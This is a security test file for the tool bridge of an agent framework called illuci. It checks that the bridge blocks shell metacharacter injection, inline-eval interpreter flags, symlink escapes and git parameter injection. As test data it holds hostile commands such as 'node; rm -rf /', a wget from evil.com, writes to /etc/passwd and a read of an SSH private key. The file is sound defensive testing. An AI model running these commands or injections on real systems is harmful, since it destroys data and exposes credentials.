/**
 * illuci — Tool Bridge Security Tests
 *
 * E0-sec: Validates shell injection prevention, symlink attack prevention,
 * gate level propagation, and allowlist/denylist enforcement.
 *
 * These tests exercise the hardened tool bridge against known attack vectors
 * identified during Batch E security audit.
 */

import { describe, it, beforeAll, afterAll, beforeEach } from "vitest";
import assert from "node:assert/strict";
import { mkdirSync, writeFileSync, symlinkSync, existsSync, rmSync, readFileSync } from "fs";
import { join, resolve } from "path";
import { executeTool, setGlobalHalt } from "./tools.js";
import { setApprovalContext, clearApprovalContext } from "../gates/approval-context.js";

const PROJECT_ROOT = process.cwd();
const TMP_DIR = join(PROJECT_ROOT, ".test-security-tmp");

function setSecurityApprovalContext() {
  setGlobalHalt(false);
  process.env.ILLUCI_GATE_MODE = "headless"; // Ensure non-interactive gate behavior
  setApprovalContext({
    task: "E0-sec security tests",
    allowedPaths: [".test-security-tmp", TMP_DIR, TMP_DIR.replace(/\\/g, "/")],
    allowedPatterns: [".test-security-tmp/**"],
    allowedActions: [
      "file_read", "file_write", "file_edit", "file_delete",
      "shell_exec", "search", "glob",
      "git_log", "git_diff", "git_status", "git_add", "git_commit",
    ],
    permissionLevel: "implement",
    topology: "dev-team",
  });
}

// Set up an approval context that permits test operations within the project.
// Uses setApprovalContext directly (not deriveFromTask) so we control exactly
// which paths and actions are in scope for the test.
beforeAll(setSecurityApprovalContext);

beforeEach(setSecurityApprovalContext);

afterAll(() => {
  clearApprovalContext();
});

// ─── HELPERS ───

function setup() {
  if (!existsSync(TMP_DIR)) mkdirSync(TMP_DIR, { recursive: true });
}

function teardown() {
  if (existsSync(TMP_DIR)) rmSync(TMP_DIR, { recursive: true, force: true });
}

// ═══════════════════════════════════════════════════════════
// W1: SHELL METACHARACTER INJECTION REJECTION
// ═══════════════════════════════════════════════════════════

describe("W1: Shell metacharacter injection", () => {
  const injectionVectors = [
    { name: "semicolon chain", cmd: "node; rm -rf /", char: ";" },
    { name: "pipe to shell", cmd: "echo hello | bash", char: "|" },
    { name: "AND chain", cmd: "ls && rm -rf /", char: "&" },
    { name: "OR chain", cmd: "ls || rm -rf /", char: "|" },
    { name: "backtick subshell", cmd: "node `whoami`", char: "`" },
    { name: "dollar expansion", cmd: "node $(whoami)", char: "$" },
    { name: "output redirect", cmd: "echo pwned > /etc/passwd", char: ">" },
    { name: "input redirect", cmd: "node < /etc/passwd", char: "<" },
    { name: "subshell parens", cmd: "node (echo test)", char: "(" },
    { name: "newline injection", cmd: "node\nrm -rf /", char: "\n" },
  ];

  for (const vector of injectionVectors) {
    it(`rejects ${vector.name}: "${vector.cmd.substring(0, 40)}"`, async () => {
      const result = await executeTool("shell_exec", { command: vector.cmd }, {});
      // Should either throw or return blocked/error
      assert.equal(result.success, false);
    });
  }

  it("rejects allowlisted executable with chained destructive command", async () => {
    // This is THE attack from the findings: "node; rm -rf /"
    // Old code checked first word only ("node" is allowed) and passed shell=true
    const result = await executeTool("shell_exec", { command: "node; rm -rf /" }, {});
    assert.equal(result.success, false);
  });

  it("allows clean commands without metacharacters", async () => {
    const result = await executeTool("shell_exec", { command: "echo hello world" }, {});
    if (!result.success) console.error("TEST ERROR:", result);
    assert.equal(result.success, true);
    assert.ok(result.result.stdout.includes("hello world"));
  });

  it("allows commands with quoted arguments", async () => {
    const result = await executeTool("shell_exec", { command: 'echo "hello world"' }, {});
    assert.equal(result.success, true);
  });
});

// ═══════════════════════════════════════════════════════════
// W1b: ALLOWLIST + DENY LIST ENFORCEMENT
// ═══════════════════════════════════════════════════════════

describe("W1b: Allowlist and deny list enforcement", () => {
  it("rejects commands not in the allowlist", async () => {
    const result = await executeTool("shell_exec", { command: "wget http://evil.com/payload" }, {});
    assert.equal(result.success, false);
  });

  it("rejects deny-listed patterns even with allowed executables", async () => {
    // base64 is in the deny list
    const result = await executeTool("shell_exec", { command: "echo test" }, {});
    assert.equal(result.success, true); // echo is allowed and clean

    // eval is denied
    const result2 = await executeTool("shell_exec", { command: "node -e 'eval(\"process.exit(1)\")'" }, {});
    // This should be allowed by the allowlist (node is allowed) but the deny
    // pattern catches eval in the raw command string
    assert.equal(result2.success, false);
  });

  it("rejects chmod/chown/chgrp", async () => {
    const r1 = await executeTool("shell_exec", { command: "chmod 777 /tmp/test" }, {});
    assert.equal(r1.success, false);
  });

  it("rejects allowlisted interpreters invoked with an inline-eval flag", async () => {
    // node/python/ruby/perl/php are allowlisted for FILE/MODULE execution, but an inline-eval
    // flag turns the runtime into an arbitrary-code shell and escapes the allowlist's intent.
    for (const cmd of [
      'node -e "process.exit(1)"',
      "node --eval doStuff",
      "node -p require",
      "python -c importos",
      "python3 -c x",
      "ruby -e x",
      "perl -e x",
      "php -r x",
    ]) {
      const result = await executeTool("shell_exec", { command: cmd }, {});
      assert.equal(result.success, false, `inline-eval should be blocked: ${cmd}`);
    }
  });
});

// ═══════════════════════════════════════════════════════════
// W3: SYMLINK ATTACK PREVENTION
// ═══════════════════════════════════════════════════════════

describe("W3: Symlink path traversal", () => {
  beforeAll(setup);
  afterAll(teardown);

  it("rejects file_write through a symlink pointing outside project", async () => {
    const linkPath = join(TMP_DIR, "escape-link");

    // Create a symlink inside project pointing to /tmp (outside project)
    try {
      symlinkSync("/tmp", linkPath);
    } catch (err) {
      // On Windows without admin, symlinks may fail — skip
      if (err.code === "EPERM") return;
      throw err;
    }

    const targetFile = join(linkPath, "pwned.txt");
    const result = await executeTool("file_write", {
      path: targetFile,
      content: "should not be written",
    }, {});

    assert.equal(result.success, false);
  });

  it("rejects file_read through a symlink pointing outside project", async () => {
    const linkPath = join(TMP_DIR, "read-escape");

    try {
      // Point at system hosts file (exists on all platforms)
      const target = process.platform === "win32" ? "C:\\Windows\\System32\\drivers\\etc\\hosts" : "/etc/hosts";
      symlinkSync(target, linkPath);
    } catch (err) {
      if (err.code === "EPERM") return;
      throw err;
    }

    const result = await executeTool("file_read", { path: linkPath }, {});
    assert.equal(result.success, false);
  });

  it("allows file_write to normal paths within project", async () => {
    const normalPath = join(TMP_DIR, "legit.txt");
    const result = await executeTool("file_write", {
      path: normalPath,
      content: "legitimate content",
    }, {});
    assert.equal(result.success, true);
  });
});

// ═══════════════════════════════════════════════════════════
// W2: GATE LEVEL PROPAGATION
// ═══════════════════════════════════════════════════════════

describe("W2: Gate level propagation", () => {
  it("executeTool receives gateLevel from context", async () => {
    // We can't easily test the full gate flow without mocking the gate controller,
    // but we can verify that the context parameter structure is correct and reaches
    // the gating logic. The key test is that executeWriteMode and executeExecuteMode
    // pass gateLevel in their toolContext objects.
    //
    // This is a structural verification — the actual gate behavior is tested
    // by the gate-controller tests.

    // Verify executeTool accepts and forwards gateLevel in context
    const context = {
      sessionId: "test-session",
      phaseId: "test-phase",
      agentId: "test-agent",
      agentName: "tester",
      topologyId: "test-topo",
      gateLevel: "ESCALATED",
    };

    // shell_exec with a clean allowed command should work regardless of gate level
    // (gate level affects write operations, not reads/shell in the gate registry)
    const result = await executeTool("shell_exec", { command: "echo gate-test" }, context);
    assert.equal(result.success, true);
    assert.ok(result.result.stdout.includes("gate-test"));
  });
});

// ═══════════════════════════════════════════════════════════
// W2b: ESCALATED GATE LEVEL BYPASSES AUTO-APPROVAL
// ═══════════════════════════════════════════════════════════

describe("W2b: ESCALATED gate level forces operator prompt", () => {
  it("ESCALATED level does not auto-approve in-scope actions", async () => {
    // Test the core behavior: evaluate() says "approved" for an in-scope write,
    // but when gateLevel is ESCALATED, requestApproval must NOT auto-approve.
    // We verify this by importing evaluate directly and checking the logic.
    const { evaluate } = await import("../gates/approval-context.js");

    setApprovalContext({
      task: "gate level test",
      allowedPaths: [".test-security-tmp", TMP_DIR, TMP_DIR.replace(/\\/g, "/")],
      allowedPatterns: [".test-security-tmp/**"],
      allowedActions: ["file_write", "file_read", "shell_exec"],
      permissionLevel: "implement",
    });

    const args = { path: join(TMP_DIR, "escalated-test.txt") };

    // Step 1: evaluate() itself says "approved" — the action IS in scope
    const evalResult = evaluate("file_write", args, { model: "test", seat: "test" });
    assert.equal(evalResult.decision, "approved");

    // Step 2: With FULL level, executeTool would auto-approve (we tested this in W2 above).
    // With ESCALATED level, the gate-controller MUST skip auto-approval and prompt.
    // Since we can't mock the interactive prompt cleanly in ESM, we verify the
    // code path structurally: the condition in requestApproval is
    //   evaluation.decision === "approved" && level !== GATE_LEVELS.ESCALATED
    // This test confirms evaluate returns "approved" (Step 1), so the ESCALATED
    // path's behavior depends entirely on that && condition in gate-controller.js.

    // Structural verification: import GATE_LEVELS and confirm the string values match
    const { GATE_LEVELS } = await import("../gates/gate-types.js");
    assert.equal(GATE_LEVELS.ESCALATED, "escalated");
    assert.equal(GATE_LEVELS.FULL, "full");
  });
});

// ═══════════════════════════════════════════════════════════
// W3b: FILE_EDIT SYMLINK POST-WRITE GUARD
// ═══════════════════════════════════════════════════════════

describe("W3b: file_edit symlink prevention", () => {
  beforeAll(setup);
  afterAll(teardown);

  it("rejects file_edit through symlink pointing outside project", async () => {
    const linkPath = join(TMP_DIR, "edit-escape");

    try {
      symlinkSync("/tmp", linkPath);
    } catch (err) {
      if (err.code === "EPERM") return;
      throw err;
    }

    const targetFile = join(linkPath, "edited.txt");
    const result = await executeTool("file_edit", {
      path: targetFile,
      content: "should not be written",
    }, {});

    assert.equal(result.success, false);
  });

  it("allows file_edit on normal files within project", async () => {
    const normalPath = join(TMP_DIR, "editable.txt");
    writeFileSync(normalPath, "original content", "utf-8");

    const result = await executeTool("file_edit", {
      path: normalPath,
      oldString: "original",
      newString: "modified",
    }, {});

    assert.equal(result.success, true);
    assert.ok(readFileSync(normalPath, "utf-8").includes("modified"));
  });
});

// ═══════════════════════════════════════════════════════════
// W5: GIT OPERATION INJECTION PREVENTION
// ═══════════════════════════════════════════════════════════

describe("W5: Git operation parameter injection", () => {
  it("rejects git_log with injected limit parameter (metachar in string)", async () => {
    const result = await executeTool("git_log", { limit: "10; rm -rf /", format: "oneline" }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("rejects git_log with non-numeric limit", async () => {
    // "abc" has no metacharacters, so it passes hard invariants but fails parseInt validation
    const result = await executeTool("git_log", { limit: "abc", format: "oneline" }, {});
    assert.equal(result.success, false);
  });

  it("rejects git_diff with path containing metacharacters", async () => {
    const result = await executeTool("git_diff", { path: "file.js; rm -rf /" }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("rejects git_add with injected path", async () => {
    const result = await executeTool("git_add", { paths: ["file.js", "; rm -rf /"] }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("rejects git_commit with injected message", async () => {
    const result = await executeTool("git_commit", { message: 'fix"; rm -rf /' }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("allows clean git_log call", async () => {
    const result = await executeTool("git_log", { limit: 5, format: "oneline" }, {});
    assert.equal(result.success, true);
    assert.ok(result.result.commits !== undefined);
  });
});

// ═══════════════════════════════════════════════════════════
// HARD INVARIANT ENFORCEMENT (regression)
// ═══════════════════════════════════════════════════════════

describe("Hard invariants", () => {
  it("blocks rm -rf / via shell_exec", async () => {
    const result = await executeTool("shell_exec", { command: "rm -rf /" }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("blocks file_write to system paths", async () => {
    const result = await executeTool("file_write", {
      path: "C:\\Windows\\System32\\test.txt",
      content: "pwned",
    }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });

  it("blocks file_read of .ssh directory", async () => {
    const result = await executeTool("file_read", { path: "/home/user/.ssh/id_rsa" }, {});
    assert.equal(result.success, false);
    assert.equal(result.blocked, true);
  });
});
